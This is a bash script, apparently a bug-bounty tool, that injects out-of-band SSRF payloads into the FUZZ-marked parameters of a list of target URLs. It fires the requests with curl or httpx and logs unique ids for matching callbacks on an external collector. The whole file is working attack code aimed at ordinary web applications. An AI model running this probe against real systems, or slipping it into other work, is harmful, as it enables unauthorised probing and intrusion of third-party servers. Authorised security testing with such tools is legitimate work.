#!/usr/bin/env bash
set -euo pipefail

# ssrf_oob.sh
# Usage:
#   ./ssrf_oob.sh "PAYLOAD_TEMPLATE" [infile] [sleep_seconds] [encode_flag]
# Example:
#   ./ssrf_oob.sh "test-%s.oob.yourcollab" potential_ssrf_FUZZ.txt 2 1
#
# Default infile: potential_ssrf_FUZZ.txt (must contain =FUZZ tokens)

TEMPLATE="${1:-}"
INFILE="${2:-potential_ssrf_FUZZ.txt}"
SLEEP="${3:-1}"
ENCODE_FLAG="${4:-0}"

if [[ -z "$TEMPLATE" ]]; then
  cat <<USAGE
Usage: $0 "PAYLOAD_TEMPLATE" [infile] [sleep_seconds] [encode_flag]
Example: $0 "test-%s.oob.yourcollab" potential_ssrf_FUZZ.txt 1 1

PAYLOAD_TEMPLATE must include a single %s which will be replaced with a unique id.
infile default: potential_ssrf_FUZZ.txt (must contain =FUZZ tokens)
sleep_seconds default: 1
encode_flag: 1 to URL-encode payload before insertion, 0 to skip
USAGE
  exit 1
fi

if [[ ! -f "$INFILE" ]]; then
  echo "Input file not found: $INFILE"
  exit 1
fi

OUT_CSV="ssrf_results.csv"
OUT_REQS="modified_payload_urls.txt"
: > "$OUT_CSV"
: > "$OUT_REQS"
echo "id,timestamp,http_status,original_url,final_url" >> "$OUT_CSV"

# ANSI colors
CLR_GREEN=$'\e[32m'
CLR_YELLOW=$'\e[33m'
CLR_RED=$'\e[31m'
CLR_RESET=$'\e[0m'
FINAL_DARK_YELLOW=$'\e[2;33m'
FINAL_SUMMARY_CYAN=$'\e[2;36m'

generate_id() {
  if command -v uuidgen >/dev/null 2>&1; then
    uuidgen
  else
    date +%s%N
  fi
}

urlencode() {
  local s="$1"
  if command -v python3 >/dev/null 2>&1; then
    python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$s"
  else
    printf '%s' "$s" | sed 's/ /%20/g'
  fi
}

# choose sender
SENDER="curl"
if command -v httpx >/dev/null 2>&1; then
  SENDER="httpx"
fi

echo "Using sender: $SENDER. Reading from $INFILE. Sleep=${SLEEP}s. URL-encode=${ENCODE_FLAG}"
echo "Preparing to process lines... (output: $OUT_CSV, $OUT_REQS)"
echo

while IFS= read -r line || [[ -n "$line" ]]; do
  # skip empty & commented lines
  [[ -z "${line// /}" ]] && continue
  [[ "${line:0:1}" == "#" ]] && continue

  id=$(generate_id)
  payload=$(printf "%s" "$(printf "$TEMPLATE" "$id")")

  if [[ "$ENCODE_FLAG" == "1" ]]; then
    payload=$(urlencode "$payload")
  fi

  # Replace =FUZZ occurrences (preserve & if present)
  final=$(printf '%s\n' "$line" | sed -E "s/=FUZZ(&|$)/=${payload}\\1/g")
  printf '%s\n' "$final" >> "$OUT_REQS"

  timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
  http_status=""

  if [[ "$SENDER" == "httpx" ]]; then
    http_status_raw=$(printf '%s\n' "$final" | httpx -silent -status-code -no-color -timeout 15 2>/dev/null || true)
    http_status=$(printf '%s' "$http_status_raw" | grep -oE '[0-9]{3}' | tail -n1 || true)
  else
    http_status=$(curl -s -o /dev/null -w "%{http_code}" -L --max-time 15 "$final" 2>/dev/null || true)
  fi

  if [[ -z "${http_status:-}" ]]; then
    http_status="ERR"
  fi

  # Log CSV (quote fields safely)
  printf '%s,"%s","%s","%s","%s"\n' "$id" "$timestamp" "$http_status" "$line" "$final" >> "$OUT_CSV"

  # Color by status range (2xx green, 3xx yellow, else red)
  if [[ "$http_status" =~ ^2[0-9][0-9]$ ]]; then
    status_colored="${CLR_GREEN}${http_status}${CLR_RESET}"
  elif [[ "$http_status" =~ ^3[0-9][0-9]$ ]]; then
    status_colored="${CLR_YELLOW}${http_status}${CLR_RESET}"
  else
    status_colored="${CLR_RED}${http_status}${CLR_RESET}"
  fi

  # color final URL in dark yellow
  final_colored="${FINAL_DARK_YELLOW}${final}${CLR_RESET}"

  # Print concise colored output
  printf '[%s] id=%s status=%b final=%s\n' "$timestamp" "$id" "$status_colored" "$final_colored"

  sleep "$SLEEP"
done < "$INFILE"

# final summary in dark cyan
printf '\n%bDone. Prepared requests saved in: %s\nResults logged to: %s\nCheck your OOB collector for hits correlated to the id values in %s.%b\n' "$FINAL_SUMMARY_CYAN" "$OUT_REQS" "$OUT_CSV" "$OUT_CSV" "$CLR_RESET"
